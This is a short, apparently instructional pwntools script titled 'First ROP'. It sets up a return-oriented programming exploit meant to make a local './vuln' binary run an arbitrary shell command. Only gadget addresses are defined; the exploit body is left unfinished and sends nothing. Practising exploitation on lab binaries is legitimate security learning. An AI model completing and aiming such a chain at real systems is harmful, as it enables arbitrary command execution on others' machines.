#!/usr/bin/env python3

"""First ROP

ROP chain designed to exploit a simple c script by execuiting a in line system call

Usage: $ python3 exploit.py CMD
"""

from pwn import *
import sys


def exploit(cmd: str) -> None:
    """Throws exploit at ./vuln

    Args:
        cmd (str): Linux bash cmd to run    
    """
    gadget = 0x401303 # pop rdi; ret;
    ret = 0x40101a # ret;
    name = 0x404080 # name location
    syscall = 0x401090




if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} CMD")
    arg = sys.argv[1]
    exploit(arg)
